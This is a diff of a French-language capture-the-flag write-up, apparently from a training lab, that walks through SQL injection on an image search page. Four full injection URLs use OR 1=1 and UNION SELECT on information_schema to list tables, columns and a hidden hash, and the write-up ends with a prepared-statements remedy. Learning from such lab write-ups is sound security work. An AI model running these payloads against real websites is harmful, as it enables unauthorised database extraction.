@@ -1,11 +1,20 @@
-Sur la page searchimg, pour rechercher les images par ID, la requete ce fait en GET, j'ai donc ajouter dans l'url:
+Sur la page searchimg.
+Pour rechercher les images par ID, la requete ce fait en GET, j'ai donc ajouter dans l'url:
 
-1. http://10.1.1.5/?page=searchimg&id=1 OR 1=1&Submit=Submit -> pour voir si ca marchait
+1. http://10.1.1.5/?page=searchimg&id=1 OR 1=1&Submit=Submit ->
+pour voir si le param etait protege ou pas. Ceci nous affiche toutes les images contenues dans la table. On voit seulement le title et l'url. On voit une image dont le tire est: Hack me ?
 
-2. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() -> donne le nom des tables, ici: list_images
+2. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() -> 
+Ce qui va nous donner le nom de la table, ici: list_images. Cela nous permettera de faire une requete directement sur cette table par la suite.
 
-3. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()&Submit=Submit -> donne le nom des colonnes
+3. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()&Submit=Submit ->
+Cette requete donne le nom des colonnes. On peut maintenant aller chercher dans les differents champs. ON voit qu'il y a un champ comment et title qui peut etre interessant
 
-4. http://10.1.1.5/?page=searchimg&id=1 or 1=1 union all select title, comment from list_images&Submit=Submit -> donne le contenu de
+4. http://10.1.1.5/?page=searchimg&id=1 or 1=1 union all select title, comment from list_images&Submit=Submit ->
+On peut maintenant faire notre requete, ce qui donne le contenu de
 title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 comment: Hack me ?
+
+Le code decrypte, on obtient: albatroz.
+
+Il faut proteger et verifier ce qu'on recoit dans les params et faire des requetes preparees pour empecher d'injecter du code SQL.
